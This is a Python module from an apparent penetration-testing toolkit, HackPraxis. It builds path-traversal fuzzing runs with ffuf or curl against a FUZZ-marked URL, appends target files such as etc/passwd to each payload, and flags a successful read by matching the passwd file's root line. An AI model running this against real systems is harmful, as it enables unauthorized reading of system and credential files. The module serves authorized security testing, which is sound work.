"""Path / directory traversal.

Mark the injection point in the URL with the ``FUZZ`` keyword (usually a file
or path parameter) and HackPraxis will feed it an extensive list of traversal
payloads: plain ``../`` sequences, URL- and double-URL-encoded forms, overlong
UTF-8, nested filter-bypass variants and reverse-proxy tricks.

ffuf is the recommended engine because it can match the *contents* of a
successful read (e.g. the shape of ``/etc/passwd``). curl mode runs one
readable request per payload and reports status/size for you to eyeball.

Payload list compiled from PayloadsAllTheThings and common public cheat sheets.
Authorized targets only.
"""

from __future__ import annotations

from pathlib import Path

from ..runner import Plan, Step

DATA = Path(__file__).resolve().parent.parent / "data"
DEFAULT_WORDLIST = str(DATA / "wordlists" / "path_traversal.txt")

# Default success signature: the first line of a Unix passwd file.
DEFAULT_MATCH = "root:.*:0:0:"

META = {
    "id": "path_traversal",
    "title": "Path Traversal",
    "blurb": "Feed traversal payloads into a FUZZ-marked parameter and spot a file read.",
    "engines": [
        {"id": "ffuf", "label": "ffuf", "tool": "ffuf",
         "hint": "Fuzz payloads and match on response content (recommended)."},
        {"id": "curl", "label": "curl (per-payload)", "tool": "curl",
         "hint": "One readable request per payload; reports status & size."},
    ],
    "fields": [
        {"name": "target", "label": "Target URL (mark the point with FUZZ)", "type": "url_combo",
         "placeholder": "https://target.example.com/download?file=FUZZ", "required": True,
         "hint": "pick a reachable URL, or type one"},
        {"name": "wordlist", "label": "Payload list path", "type": "text",
         "placeholder": DEFAULT_WORDLIST, "default": DEFAULT_WORDLIST},
        {"name": "target_file", "label": "Target file to append (optional)", "type": "text",
         "placeholder": "etc/passwd  (appended after each traversal prefix)"},
        {"name": "match_regex", "label": "Match regex (ffuf)", "type": "text",
         "default": DEFAULT_MATCH, "engines": ["ffuf"]},
        {"name": "max_requests", "label": "Max requests (curl mode)", "type": "number",
         "default": 120, "engines": ["curl"]},
    ],
}


def _read_payloads(path: Path) -> list[str]:
    if not path.exists():
        return []
    out = []
    for raw in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        s = raw.strip()
        if s and not s.startswith("#"):
            out.append(s)
    return out


def _apply_target_file(payloads: list[str], target_file: str) -> list[str]:
    """Optionally append a concrete file after each traversal prefix.

    With a target file set, ``../../../`` becomes ``../../../etc/passwd``. Left
    blank, payloads are used exactly as written (the list already contains some
    complete ones).
    """
    tf = (target_file or "").strip().lstrip("/")
    if not tf:
        return payloads
    return [p + tf for p in payloads]


def build(params: dict) -> Plan:
    engine = params.get("engine", "ffuf")
    target = (params.get("target") or "").strip()
    wordlist = (params.get("wordlist") or DEFAULT_WORDLIST).strip()
    target_file = params.get("target_file") or ""

    if "FUZZ" not in target:
        # Make the requirement explicit rather than guessing an injection point.
        return Plan(module="path_traversal", engine=engine,
                    title="Traversal (needs FUZZ)",
                    summary="Add the FUZZ keyword where the payload should be injected, "
                            "e.g. ?file=FUZZ.", steps=[])

    if engine == "curl":
        try:
            budget = int(params.get("max_requests") or 120)
        except (TypeError, ValueError):
            budget = 120
        budget = max(1, min(budget, 400))
        steps: list[Step] = []
        payloads = _apply_target_file(_read_payloads(Path(wordlist)), target_file)[:budget]
        for payload in payloads:
            url = target.replace("FUZZ", payload)
            argv = ["curl", "-sS", "-k", "-o", "/dev/null",
                    "-w", "%{http_code} %{size_download} %{time_total}",
                    "--max-time", "12", url]
            steps.append(Step(
                tool="curl", argv=argv, target=url, parse="curl-metrics",
                label=f"payload: {payload}",
                explain=[
                    {"token": "-o /dev/null -w ...", "meaning": "Discard body, keep status/size/time."},
                    {"token": "FUZZ → payload", "meaning": f"Injected: {payload}"},
                    {"token": "--max-time 12", "meaning": "Per-request timeout."},
                ],
            ))
        summary = (f"{len(steps)} traversal payloads via curl. A larger-than-normal "
                   "response size, or a 200 where others 404, is worth opening by hand.")
        return Plan(module="path_traversal", engine=engine,
                    title="Path traversal (curl)", summary=summary, steps=steps)

    # default: ffuf
    mr = (params.get("match_regex") or DEFAULT_MATCH).strip()
    wl_for_ffuf = wordlist
    if (target_file or "").strip():
        # ffuf reads a file, so bake "<payload><target_file>" into a temp list.
        combined = _apply_target_file(_read_payloads(Path(wordlist)), target_file)
        from ..paths import runs_dir
        tmp = runs_dir() / "traversal_combined.txt"
        tmp.write_text("\n".join(combined) + "\n", encoding="utf-8")
        wl_for_ffuf = str(tmp)
    argv = ["ffuf", "-u", target, "-w", wl_for_ffuf, "-mr", mr, "-c"]
    explain = [
        {"token": "-u <url>", "meaning": "URL containing FUZZ, the traversal injection point."},
        {"token": "-w <payloads>", "meaning": "Traversal payload list fed into FUZZ."},
        {"token": f"-mr '{mr}'", "meaning": "Match responses whose body matches this regex "
                                            "(the signature of a successful file read)."},
        {"token": "-c", "meaning": "Colorize output."},
    ]
    step = Step(tool="ffuf", argv=argv, target=target, parse="raw",
                label="ffuf traversal", explain=explain)
    summary = ("Fuzz the payload list into FUZZ and surface only responses whose body "
               f"matches /{mr}/. Change the regex to match your target file.")
    return Plan(module="path_traversal", engine=engine,
                title="Path traversal (ffuf)", summary=summary, steps=[step])
